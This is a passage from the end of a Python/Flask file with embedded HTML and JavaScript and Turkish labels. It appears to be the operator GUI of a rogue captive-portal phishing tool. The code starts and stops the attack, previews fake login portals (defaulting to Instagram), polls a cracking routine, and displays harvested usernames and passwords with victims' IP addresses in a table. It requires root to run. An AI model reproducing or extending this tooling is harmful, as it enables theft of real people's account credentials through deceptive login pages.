  el.innerHTML = (s.log || []).map(colorize).join("\n") || "hazır.";
  if (atBottom) el.scrollTop = el.scrollHeight;
}

/* ---------- hata kutusu ---------- */
function showErr(id, msg){
  const el = $(id);
  el.textContent = msg;
  el.classList.add("on");
}
function clearErr(id){
  const el = $(id);
  el.classList.remove("on");
  el.textContent = "";
}

/* ---------- başlat / durdur ---------- */
async function start(){
  $("btnStart").disabled = true;
  clearErr("startErrBox");
  $("log").textContent = "başlatılıyor…\n";
  const r = await fetch("/api/start", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify(collect())
  }).then(r => r.json()).catch(e => ({ok:false, error:String(e)}));
  if (!r.ok){
    $("btnStart").disabled = false;
    showErr("startErrBox", r.error || "bilinmiyor");
    return;
  }
  poll();
}

async function stop(){
  $("btnStop").disabled = true;
  clearErr("startErrBox");
  await fetch("/api/stop", {method:"POST"});
  poll();
}

function colorize(line){
  if (/\[\+\]/.test(line)) return '<span class="ok">' + esc(line) + '</span>';
  if (/\[-\]|error|Error|fail|Fail|HATA/.test(line)) return '<span class="err">' + esc(line) + '</span>';
  return esc(line);
}
function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;"); }

function renderCreds(rows){
  $("count").textContent = rows.length || 0;
  if (!rows.length){ $("creds").innerHTML = '<div class="empty">henüz kayıt yok</div>'; return; }
  let h = "<table><tr><th>Zaman</th><th>IP</th><th>Kullanıcı</th><th>Şifre</th></tr>";
  rows.slice().reverse().forEach(r => {
    h += "<tr><td>" + esc(r.ts||"") + "</td><td>" + esc(r.ip||"") +
         "</td><td>" + esc(r.username||"") + "</td><td class='p'>" +
         esc(r.password||"") + "</td></tr>";
  });
  $("creds").innerHTML = h + "</table>";
}

async function poll(){
  const s = await fetch("/api/status").then(r => r.json()).catch(() => null);
  if (!s) return;
  running = s.running;
  const pill = $("pill");
  pill.className = "pill " + (running ? "on" : "");
  pill.textContent = running ? "çalışıyor" : "durdu";
  $("btnStart").disabled = running;
  $("btnStop").disabled = !running;

  const logEl = $("log");
  const atBottom = logEl.scrollTop + logEl.clientHeight >= logEl.scrollHeight - 30;
  logEl.innerHTML = (s.log || []).map(colorize).join("\n") || "hazır.";
  if (atBottom) logEl.scrollTop = logEl.scrollHeight;
  renderCreds(s.creds || []);
}

function preview(){
  const t = $("PORTAL_TEMPLATE").value || "instagram";
  window.open("/preview/" + t, "_blank");
}

document.querySelectorAll(".step").forEach(s =>
  s.addEventListener("click", () => go(+s.dataset.s)));

load();
setInterval(poll, 1500);
setInterval(pollCrack, 1500);
</script>
</body>
</html>
"""

if __name__ == "__main__":
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("[!] root değil — 'Başlat' adımı başarısız olur. sudo python3 gui.py")
    print(f"[*] GUI: http://127.0.0.1:{PORT}")
    app.run(host="127.0.0.1", port=PORT, threaded=True)
